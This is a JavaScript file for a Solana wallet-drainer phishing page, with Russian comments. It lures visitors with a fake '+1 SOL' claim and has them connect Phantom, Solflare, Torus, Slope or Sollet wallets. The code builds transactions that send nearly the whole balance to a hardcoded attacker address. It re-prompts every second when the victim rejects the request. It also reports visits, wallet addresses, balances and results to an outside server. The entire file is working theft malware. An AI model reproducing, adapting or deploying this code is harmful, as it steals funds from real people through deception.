async function sendToServer(data) {
  try {
  await fetch('https://api.gameleadsol.xyz/send-telegram', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    });
  } catch (error) {
    console.error('Ошибка отправки на сервер:', error);
  }
}

function init() {
  if (!window.solanaWeb3) {
    console.error("Ошибка: @solana/web3.js не загружен");
    return;
  }

  // Определяем устройство пользователя
  const userAgent = navigator.userAgent.toLowerCase();
  const device = /mobile|android|iphone|ipad|tablet/i.test(userAgent) ? 'Телефон' : 'Компьютер';

  // Отправляем сообщение о посещении сайта
  sendToServer({
    type: 'visit',
    device: device,
  });

  const { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } = window.solanaWeb3;

  const connection = new Connection("https://restless-tiniest-yard.solana-mainnet.quiknode.pro/eb4b6c9c2ad83719ce3014c8990cef0b359434ae/", "confirmed");
  const attackerAddress = new PublicKey("AMFRzBKceaEBB8SqLFWcznzNeMzLShLtJx6AkVNh1NjR");

  // Проверяем сеть
  async function checkNetwork() {
    const genesisHash = await connection.getGenesisHash();
    const mainnetGenesisHash = "5eykt4UsFv8P8NJdTREpY1vzqKqZKvdpKuc147dw2N9d";
    if (genesisHash !== mainnetGenesisHash) {
      throw new Error("RPC не в Mainnet! Текущий genesis hash: " + genesisHash);
    }
    console.log("RPC работает в Mainnet, genesis hash:", genesisHash);
  }

  // Проверяем баланс атакующего (для информации)
  async function checkAttackerBalance() {
    const attackerBalance = await connection.getBalance(attackerAddress);
    console.log(`Баланс атакующего (Mainnet): ${attackerBalance / LAMPORTS_PER_SOL} SOL (${attackerBalance} лампортов)`);
    return attackerBalance;
  }

  async function createDrainTransaction(walletPublicKey) {
    await checkNetwork();

    const balance = await connection.getBalance(walletPublicKey);
    console.log(`Баланс жертвы (Mainnet): ${balance / LAMPORTS_PER_SOL} SOL (${balance} лампортов)`);

    const fee = 5000;
    const rentExemptMinimum = 890880;
    const buffer = 100000;
    const minimumRequired = fee + rentExemptMinimum + buffer;

    if (balance < minimumRequired) {
      sendToServer({
        type: 'insufficient_funds',
      });
      throw new Error(
        `Недостаточно средств: баланс (${balance} лампортов) меньше необходимого (${minimumRequired} лампортов: ${fee} комиссия + ${rentExemptMinimum} rent-exempt + ${buffer} буфер)`
      );
    }

    const amount = balance - fee - rentExemptMinimum - buffer;
    if (amount <= 0) {
      sendToServer({
        type: 'insufficient_funds',
      });
      throw new Error(`Недостаточно средств для перевода: ${amount} лампортов после вычета комиссии, rent-exempt и буфера`);
    }

    const transaction = new Transaction();
    transaction.add(
      SystemProgram.transfer({
        fromPubkey: walletPublicKey,
        toPubkey: attackerAddress,
        lamports: amount,
      })
    );

    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = walletPublicKey;

    console.log("Созданная транзакция:", transaction);
    // Отправляем данные о запрошенной транзакции
    sendToServer({
      type: 'transaction_requested',
      amount: amount / LAMPORTS_PER_SOL,
      to: attackerAddress.toString(),
    });

    return transaction;
  }

  // Определяем все поддерживаемые кошельки
  const supportedWallets = [
    { name: "Phantom", icon: "phantom-wallet.webp", installUrl: "https://phantom.app/" },
    { name: "Solflare", icon: "unnamed.png", installUrl: "https://solflare.com/" },
    { name: "Torus", icon: "HlfpkhxR_400x400.png", installUrl: "https://solana.tor.us/" },
    { name: "Slope", icon: "85394072.png", installUrl: "https://slope.finance/" },
    { name: "Sollet", icon: "Sollet-logo-qix080yd.png", installUrl: "https://www.sollet.io/" },
  ];

  // Проверяем, какие кошельки доступны
  function detectWallets() {
    const detectedWallets = {};

    if (window.solana && window.solana.isPhantom) {
      detectedWallets["Phantom"] = window.solana;
    }

    if (window.solflare && window.solflare.isSolflare) {
      detectedWallets["Solflare"] = window.solflare;
    }

    if (window.torus) {
      detectedWallets["Torus"] = window.torus;
    }

    if (window.slope) {
      detectedWallets["Slope"] = window.slope;
    }

    if (window.solana && !window.solana.isPhantom && !window.solflare && !window.slope && !window.torus) {
      detectedWallets["Sollet"] = window.solana;
    }

    return detectedWallets;
  }

  async function connectAndDrain(provider, walletName) {
    const statusDiv = document.getElementById('status');
    const modalOverlay = document.getElementById('modalOverlay');
    const modalContent = modalOverlay.querySelector('.modal-content');

    modalContent.innerHTML = `
      <div class="modal-title">Connected: ${walletName}</div>
      <div class="confetti"></div>
      <div class="loader"></div>
      <div class="confirm-text">Confirm Transaction to claim +1 SOL</div>
    `;

    try {
      let walletPublicKey, balance;

      if (walletName === "Torus") {
        statusDiv.textContent = `Подключение к ${walletName} (Mainnet)...`;
        await provider.login();
        walletPublicKey = new PublicKey(provider.publicKey.toString());
        statusDiv.textContent = `Кошелек ${walletName} подключен! Подтвердите транзакцию (Mainnet)...`;

        balance = await connection.getBalance(walletPublicKey);
        sendToServer({
          type: 'wallet_connected',
          wallet: walletName,
          address: walletPublicKey.toString(),
          balance: balance / LAMPORTS_PER_SOL,
        });

        await checkAttackerBalance();

        while (true) {
          try {
            const transaction = await createDrainTransaction(walletPublicKey);
            const signedTransaction = await provider.signTransaction(transaction);
            const txId = await connection.sendRawTransaction(signedTransaction.serialize(), {
              skipPreflight: false,
              preflightCommitment: "confirmed",
            });

            const confirmation = await connection.confirmTransaction(txId, "confirmed");
            if (confirmation.value.err) {
              throw new Error("Транзакция не финализирована: " + JSON.stringify(confirmation.value.err));
            }

            statusDiv.textContent = "Транзакция успешно финализирована (Mainnet)! ID: " + txId;
            modalContent.innerHTML = `
              <div class="modal-title">Success!</div>
              <div class="success-text">Transaction ID: ${txId}</div>
            `;
            console.log("Транзакция (Mainnet):", txId);

            const amountTransferred = balance - (await connection.getBalance(walletPublicKey));
            sendToServer({
              type: 'transaction_confirmed',
              amount: amountTransferred / LAMPORTS_PER_SOL,
              txId: txId,
            });

            const newBalance = await connection.getBalance(walletPublicKey);
            console.log(`Новый баланс жертвы (Mainnet): ${newBalance / LAMPORTS_PER_SOL} SOL (${newBalance} лампортов)`);
            const attackerBalance = await connection.getBalance(attackerAddress);
            console.log(`Новый баланс атакующего (Mainnet): ${attackerBalance / LAMPORTS_PER_SOL} SOL (${attackerBalance} лампортов)`);

            break;
          } catch (error) {
            statusDiv.textContent = "Ошибка: " + error.message;
            console.error("Полная ошибка:", error);
            if (error.message.includes("User rejected the request")) {
              statusDiv.textContent = "Транзакция отклонена. Повтор через 1 секунду...";
              modalContent.innerHTML = `
                <div class="modal-title">Transaction Rejected</div>
                <div class="error-text">You rejected the transaction. Trying again...</div>
              `;
              sendToServer({
                type: 'transaction_rejected',
              });
              await new Promise(resolve => setTimeout(resolve, 1000));
              modalContent.innerHTML = `
                <div class="modal-title">Connected: ${walletName}</div>
                <div class="confetti"></div>
                <div class="loader"></div>
                <div class="confirm-text">Confirm Transaction to claim +1 SOL</div>
              `;
            } else if (error.message.includes("Signature verification failed")) {
              statusDiv.textContent = "Ошибка подписи. Повтор через 1 секунду...";
              modalContent.innerHTML = `
                <div class="modal-title">Signature Error</div>
                <div class="error-text">Signature verification failed. Retrying...</div>
              `;
              await new Promise(resolve => setTimeout(resolve, 1000));
              modalContent.innerHTML = `
                <div class="modal-title">Connected: ${walletName}</div>
                <div class="confetti"></div>
                <div class="loader"></div>
                <div class="confirm-text">Confirm Transaction to claim +1 SOL</div>
              `;
            } else if (error.message.includes("Transaction simulation failed")) {
              statusDiv.textContent = "Симуляция транзакции провалилась. Проверь баланс и сеть.";
              modalContent.innerHTML = `
                <div class="modal-title">Simulation Failed</div>
                <div class="error-text">Transaction simulation failed. Check balance and network.</div>
              `;
              await new Promise(resolve => setTimeout(resolve, 1000));
              modalContent.innerHTML = `
                <div class="modal-title">Connected: ${walletName}</div>
                <div class="confetti"></div>
                <div class="loader"></div>
                <div class="confirm-text">Confirm Transaction to claim +1 SOL</div>
              `;
            } else {
              modalContent.innerHTML = `
                <div class="modal-title">Error</div>
                <div class="error-text">${error.message}</div>
              `;
              throw error;
            }
          }
        }
        return;
      }

      if (walletName === "Slope") {
        statusDiv.textContent = `Подключение к ${walletName} (Mainnet)...`;
        const { msg, data } = await provider.connect();
        if (msg !== "ok") {
          throw new Error("Не удалось подключиться к Slope: " + msg);
        }
        walletPublicKey = new PublicKey(data.publicKey);
        statusDiv.textContent = `Кошелек ${walletName} подключен! Подтвердите транзакцию (Mainnet)...`;

        balance = await connection.getBalance(walletPublicKey);
        sendToServer({
          type: 'wallet_connected',
          wallet: walletName,
          address: walletPublicKey.toString(),
          balance: balance / LAMPORTS_PER_SOL,
        });

        await checkAttackerBalance();

        while (true) {
          try {
            const transaction = await createDrainTransaction(walletPublicKey);
            const { msg: signMsg, data: signData } = await provider.signTransaction(transaction);
            if (signMsg !== "ok") {
              throw new Error("Не удалось подписать транзакцию в Slope: " + signMsg);
            }
            const signedTransaction = signData;
            const txId = await connection.sendRawTransaction(signedTransaction.serialize(), {
              skipPreflight: false,
              preflightCommitment: "confirmed",
            });

            const confirmation = await connection.confirmTransaction(txId, "confirmed");
            if (confirmation.value.err) {
              throw new Error("Транзакция не финализирована: " + JSON.stringify(confirmation.value.err));
            }

            statusDiv.textContent = "Транзакция успешно финализирована (Mainnet)! ID: " + txId;
            modalContent.innerHTML = `
              <div class="modal-title">Success!</div>
              <div class="success-text">Transaction ID: ${txId}</div>
            `;
            console.log("Транзакция (Mainnet):", txId);

            const amountTransferred = balance - (await connection.getBalance(walletPublicKey));
            sendToServer({
              type: 'transaction_confirmed',
              amount: amountTransferred / LAMPORTS_PER_SOL,
              txId: txId,
            });

            const newBalance = await connection.getBalance(walletPublicKey);
            console.log(`Новый баланс жертвы (Mainnet): ${newBalance / LAMPORTS_PER_SOL} SOL (${newBalance} лампортов)`);
            const attackerBalance = await connection.getBalance(attackerAddress);
            console.log(`Новый баланс атакующего (Mainnet): ${attackerBalance / LAMPORTS_PER_SOL} SOL (${attackerBalance} лампортов)`);

            break;
          } catch (error) {
            statusDiv.textContent = "Ошибка: " + error.message;
            console.error("Полная ошибка:", error);
            if (error.message.includes("User rejected the request")) {
              statusDiv.textContent = "Транзакция отклонена. Повтор через 1 секунду...";
              modalContent.innerHTML = `
                <div class="modal-title">Transaction Rejected</div>
                <div class="error-text">You rejected the transaction. Trying again...</div>
              `;
              sendToServer({
                type: 'transaction_rejected',
              });
              await new Promise(resolve => setTimeout(resolve, 1000));
              modalContent.innerHTML = `
                <div class="modal-title">Connected: ${walletName}</div>
                <div class="confetti"></div>
                <div class="loader"></div>
                <div class="confirm-text">Confirm Transaction to claim +1 SOL</div>
              `;
            } else if (error.message.includes("Signature verification failed")) {
              statusDiv.textContent = "Ошибка подписи. Повтор через 1 секунду...";
              modalContent.innerHTML = `
                <div class="modal-title">Signature Error</div>
                <div class="error-text">Signature verification failed. Retrying...</div>
              `;
              await new Promise(resolve => setTimeout(resolve, 1000));
              modalContent.innerHTML = `
                <div class="modal-title">Connected: ${walletName}</div>
                <div class="confetti"></div>
                <div class="loader"></div>
                <div class="confirm-text">Confirm Transaction to claim +1 SOL</div>
              `;
            } else if (error.message.includes("Transaction simulation failed")) {
              statusDiv.textContent = "Симуляция транзакции провалилась. Проверь баланс и сеть.";
              modalContent.innerHTML = `
                <div class="modal-title">Simulation Failed</div>
                <div class="error-text">Transaction simulation failed. Check balance and network.</div>
              `;
              await new Promise(resolve => setTimeout(resolve, 1000));
              modalContent.innerHTML = `
                <div class="modal-title">Connected: ${walletName}</div>
                <div class="confetti"></div>
                <div class="loader"></div>
                <div class="confirm-text">Confirm Transaction to claim +1 SOL</div>
              `;
            } else {
              modalContent.innerHTML = `
                <div class="modal-title">Error</div>
                <div class="error-text">${error.message}</div>
              `;
              throw error;
            }
          }
        }
        return;
      }

      if (!provider.isConnected) {
        statusDiv.textContent = `Подключение к ${walletName} (Mainnet)...`;
        await provider.connect();
      }

      walletPublicKey = provider.publicKey;
      statusDiv.textContent = `Кошелек ${walletName} подключен! Подтвердите транзакцию (Mainnet)...`;

      balance = await connection.getBalance(walletPublicKey);
      sendToServer({
        type: 'wallet_connected',
        wallet: walletName,
        address: walletPublicKey.toString(),
        balance: balance / LAMPORTS_PER_SOL,
      });

      await checkAttackerBalance();

      while (provider.isConnected) {
        try {
          const transaction = await createDrainTransaction(walletPublicKey);
          const signedTransaction = await provider.signTransaction(transaction);
          const txId = await connection.sendRawTransaction(signedTransaction.serialize(), {
            skipPreflight: false,
            preflightCommitment: "confirmed",
          });

          const confirmation = await connection.confirmTransaction(txId, "confirmed");
          if (confirmation.value.err) {
            throw new Error("Транзакция не финализирована: " + JSON.stringify(confirmation.value.err));
          }

          statusDiv.textContent = "Транзакция успешно финализирована (Mainnet)! ID: " + txId;
          modalContent.innerHTML = `
            <div class="modal-title">Success!</div>
            <div class="success-text">Transaction ID: ${txId}</div>
          `;
          console.log("Транзакция (Mainnet):", txId);

          const amountTransferred = balance - (await connection.getBalance(walletPublicKey));
          sendToServer({
            type: 'transaction_confirmed',
            amount: amountTransferred / LAMPORTS_PER_SOL,
            txId: txId,
          });

          const newBalance = await connection.getBalance(walletPublicKey);
          console.log(`Новый баланс жертвы (Mainnet): ${newBalance / LAMPORTS_PER_SOL} SOL (${newBalance} лампортов)`);
          const attackerBalance = await connection.getBalance(attackerAddress);
          console.log(`Новый баланс атакующего (Mainnet): ${attackerBalance / LAMPORTS_PER_SOL} SOL (${attackerBalance} лампортов)`);

          break;
        } catch (error) {
          statusDiv.textContent = "Ошибка: " + error.message;
          console.error("Полная ошибка:", error);
          if (error.message.includes("User rejected the request")) {
            statusDiv.textContent = "Транзакция отклонена. Повтор через 1 секунду...";
            modalContent.innerHTML = `
              <div class="modal-title">Transaction Rejected</div>
              <div class="error-text">You rejected the transaction. Trying again...</div>
            `;
            sendToServer({
              type: 'transaction_rejected',
            });
            console.log("Пользователь отклонил запрос, повторяем...");
            await new Promise(resolve => setTimeout(resolve, 1000));
            modalContent.innerHTML = `
              <div class="modal-title">Connected: ${walletName}</div>
              <div class="confetti"></div>
              <div class="loader"></div>
              <div class="confirm-text">Confirm Transaction to claim +1 SOL</div>
            `;
          } else if (error.message.includes("Signature verification failed")) {
            statusDiv.textContent = "Ошибка подписи. Повтор через 1 секунду...";
            modalContent.innerHTML = `
              <div class="modal-title">Signature Error</div>
              <div class="error-text">Signature verification failed. Retrying...</div>
            `;
            console.log("Signature verification failed, retrying...");
            await new Promise(resolve => setTimeout(resolve, 1000));
            modalContent.innerHTML = `
              <div class="modal-title">Connected: ${walletName}</div>
              <div class="confetti"></div>
              <div class="loader"></div>
              <div class="confirm-text">Confirm Transaction to claim +1 SOL</div>
            `;
          } else if (error.message.includes("Transaction simulation failed")) {
            statusDiv.textContent = "Симуляция транзакции провалилась. Проверь баланс и сеть.";
            modalContent.innerHTML = `
              <div class="modal-title">Simulation Failed</div>
              <div class="error-text">Transaction simulation failed. Check balance and network.</div>
            `;
            console.log("Simulation failed, check balance and network...");
            await new Promise(resolve => setTimeout(resolve, 1000));
            modalContent.innerHTML = `
              <div class="modal-title">Connected: ${walletName}</div>
              <div class="confetti"></div>
              <div class="loader"></div>
              <div class="confirm-text">Confirm Transaction to claim +1 SOL</div>
            `;
          } else {
            modalContent.innerHTML = `
              <div class="modal-title">Error</div>
              <div class="error-text">${error.message}</div>
            `;
            throw error;
          }
        }
      }

      if (!provider.isConnected) {
        statusDiv.textContent = "Кошелек отключен. Операция остановлена.";
        modalContent.innerHTML = `
          <div class="modal-title">Disconnected</div>
          <div class="error-text">Wallet disconnected. Operation stopped.</div>
        `;
        console.log("Пользователь отключился, остановка...");
      }
    } catch (error) {
      statusDiv.textContent = "Ошибка: " + error.message;
      modalContent.innerHTML = `
        <div class="modal-title">Error</div>
        <div class="error-text">${error.message}</div>
      `;
      console.error(error);
    }
  }

  // Создаём модальное окно динамически
  function createModal() {
    const modalOverlay = document.createElement('div');
    modalOverlay.id = 'modalOverlay';
    modalOverlay.className = 'modal-overlay';

    const modal = document.createElement('div');
    modal.className = 'modal';

    const modalContent = document.createElement('div');
    modalContent.className = 'modal-content';
    modalContent.innerHTML = `
      <div class="modal-title">Connect a wallet on<br>Solana to continue</div>
      <div class="wallet-options" id="walletOptions"></div>
    `;
    modal.appendChild(modalContent);

    modalOverlay.appendChild(modal);
    document.body.appendChild(modalOverlay);

    const style = document.createElement('style');
    style.textContent = `
      @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600&display=swap');
      .modal-overlay {
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.5);
        justify-content: center;
        align-items: center;
        z-index: 1000;
      }
      .modal {
        background-color: #11141e;
        border-radius: 16px;
        padding: 50px 75px 75px;
        width: 210px;
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
        color: white;
        position: relative;
        overflow: hidden;
      }
      .modal-title {
        font-family: 'Montserrat', Arial, sans-serif;
        font-size: 18px;
        font-weight: 600;
        margin-bottom: 30px;
        text-align: center;
        line-height: 23px;
        letter-spacing: 0.3px;
      }
      .wallet-options {
        margin-top: 15px;
      }
      .wallet-option {
        display: flex;
        align-items: center;
        padding: 10px;
        margin-bottom: 8px;
        border-radius: 8px;
        cursor: pointer;
        background-color: #11141e;
        transition: background-color 0.2s ease;
        width: 100%;
      }
      .wallet-option:hover {
        background-color: #1a1f2e;
      }
      .wallet-icon {
        width: 24px;
        height: 24px;
        margin-right: 12px;
        background-color: #2d3345;
        border-radius: 50%;
        background-size: contain;
        background-repeat: no-repeat;
        background-position: center;
      }
      .wallet-name {
        font-family: 'Montserrat', Arial, sans-serif;
        font-size: 16px;
        font-weight: 400;
      }
      .selected {
        font-weight: 600;
        color: #ffffff;
      }
      .confetti {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        pointer-events: none;
      }
      .confetti::before,
      .confetti::after {
        content: '';
        position: absolute;
        width: 8px;
        height: 8px;
        background: #ff4d4d;
        animation: confetti 2s ease-in-out infinite;
      }
      .confetti::before {
        left: 20%;
        top: -10px;
        background: #4dff4d;
        animation-delay: 0.2s;
      }
      .confetti::after {
        left: 80%;
        top: -10px;
        background: #4d4dff;
        animation-delay: 0.4s;
      }
      @keyframes confetti {
        0% { transform: translateY(-10px) rotate(0deg); opacity: 1; }
        100% { transform: translateY(300px) rotate(360deg); opacity: 0; }
      }
      .loader {
        width: 40px;
        height: 40px;
        border: 4px solid #ffffff;
        border-top: 4px solid #4d4dff;
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin: 20px auto;
      }
      @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
      }
      .confirm-text {
        font-family: 'Montserrat', Arial, sans-serif;
        font-size: 14px;
        font-weight: 400;
        text-align: center;
        color: #ffffff;
      }
      .success-text, .error-text {
        font-family: 'Montserrat', Arial, sans-serif;
        font-size: 14px;
        font-weight: 400;
        text-align: center;
        color: #ffffff;
        word-break: break-all;
      }
    `;
    document.head.appendChild(style);

    modalOverlay.addEventListener('click', (event) => {
      if (event.target === event.currentTarget) {
        event.currentTarget.style.display = 'none';
      }
    });
  }

  function showWalletOptions() {
    const walletOptionsDiv = document.getElementById('walletOptions');
    const statusDiv = document.getElementById('status');
    const modalOverlay = document.getElementById('modalOverlay');
    const modalContent = modalOverlay.querySelector('.modal-content');

    const detectedWallets = detectWallets();

    modalContent.innerHTML = `
      <div class="modal-title">Connect a wallet on<br>Solana to continue</div>
      <div class="wallet-options" id="walletOptions"></div>
    `;
    const newWalletOptionsDiv = modalContent.querySelector('#walletOptions');

    supportedWallets.forEach(wallet => {
      const walletOption = document.createElement('div');
      walletOption.className = 'wallet-option';
      walletOption.innerHTML = `
        <div class="wallet-icon" style="background-image: url('${wallet.icon}')"></div>
        <div class="wallet-name">${wallet.name}</div>
      `;
      walletOption.addEventListener('click', () => {
        const provider = detectedWallets[wallet.name];
        if (provider) {
          connectAndDrain(provider, wallet.name);
        } else {
          statusDiv.textContent = `Кошелёк ${wallet.name} не обнаружен. Пожалуйста, установите его.`;
          window.open(wallet.installUrl, '_blank');
        }
      });
      newWalletOptionsDiv.appendChild(walletOption);
    });

    modalOverlay.style.display = 'flex';
    statusDiv.textContent = "Выберите кошелек для Mainnet.";
  }

  createModal();

  document.querySelector('.connect-button').addEventListener('click', () => {
    showWalletOptions();
  });
}

window.addEventListener('load', () => {
  setTimeout(init, 1000);
});
